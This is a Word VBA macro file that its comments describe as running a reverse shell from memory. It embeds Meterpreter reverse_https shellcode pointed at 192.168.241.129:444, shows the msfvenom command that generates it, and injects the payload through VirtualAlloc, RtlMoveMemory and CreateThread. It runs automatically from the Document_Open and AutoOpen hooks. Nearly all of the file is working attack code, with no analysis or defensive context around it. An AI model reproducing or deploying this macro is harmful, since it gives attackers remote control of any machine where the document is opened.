'This VBA code runs a reverse shell from memory using Win32 API Calls
'The Shellcode has to be generated first like the following example:
'msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.241.129 LPORT=444 EXITFUNC=thread -f vbapplication

'1. Declare the WIn32 API Functions in VBA
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

'Define variables, Load the payload in memory and execute
Function RunFromMemory()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    buf = Array(252,232,143,0,0,0,96,49,210,137,229,100,139,82,48,139,82,12,139,82,20,49,255,139,114,40,15,183,74,38,49,192,172,60,97,124,2,44,32,193,207,13,1,199,73,117,239,82,139,82,16,87,139,66,60,1,208,139,64,120,133,192,116,76,1,208,80,139,88,32,1,211,139,72,24,133,201,116,60,49,255, _
73,139,52,139,1,214,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125,36,117,224,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18,233,128,255,255,255,93,104,110,101,116,0,104,119,105,110,105,84, _
104,76,119,38,7,255,213,49,219,83,83,83,83,83,232,62,0,0,0,77,111,122,105,108,108,97,47,53,46,48,32,40,87,105,110,100,111,119,115,32,78,84,32,54,46,49,59,32,84,114,105,100,101,110,116,47,55,46,48,59,32,114,118,58,49,49,46,48,41,32,108,105,107,101,32,71,101,99,107,111, _
0,104,58,86,121,167,255,213,83,83,106,3,83,83,104,188,1,0,0,232,80,1,0,0,47,55,79,111,88,48,122,78,56,78,90,107,50,103,84,101,65,86,119,53,69,89,81,78,113,78,120,107,48,121,101,109,81,103,80,89,100,119,102,48,98,117,117,120,83,87,81,95,121,111,57,77,82,104,49,48, _
114,99,69,83,111,98,68,74,87,110,97,66,70,116,74,112,81,54,56,73,89,71,102,56,69,69,85,118,102,84,120,110,67,118,109,74,73,116,95,89,87,49,71,119,106,70,122,51,79,78,90,102,68,78,111,107,73,87,90,101,55,80,103,122,114,57,109,77,56,89,118,104,66,103,110,119,54,101,116,50, _
122,90,81,45,120,74,111,76,85,50,106,52,66,102,99,75,51,52,121,89,79,77,84,101,78,108,87,110,79,88,121,88,120,78,48,72,118,97,90,51,68,119,66,90,83,65,115,104,67,108,54,79,83,89,78,97,0,80,104,87,137,159,198,255,213,137,198,83,104,0,50,232,132,83,83,83,87,83,86,104, _
235,85,46,59,255,213,150,106,10,95,104,128,51,0,0,137,224,106,4,80,106,31,86,104,117,70,158,134,255,213,83,83,83,83,86,104,45,6,24,123,255,213,133,192,117,20,104,136,19,0,0,104,68,240,53,224,255,213,79,117,205,232,76,0,0,0,106,64,104,0,16,0,0,104,0,0,64,0,83,104, _
88,164,83,229,255,213,147,83,83,137,231,87,104,0,32,0,0,83,86,104,18,150,137,226,255,213,133,192,116,207,139,7,1,195,133,192,117,229,88,195,95,232,107,255,255,255,49,57,50,46,49,54,56,46,50,52,49,46,49,50,57,0,187,224,29,42,10,104,166,149,189,157,255,213,60,6,124,10,128,251, _
224,117,5,187,71,19,114,111,106,0,83,255,213)

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

'Automatically execute with the word document
Sub Document_Open()
    RunFromMemory
End Sub

Sub AutoOpen()
    RunFromMemory
End Sub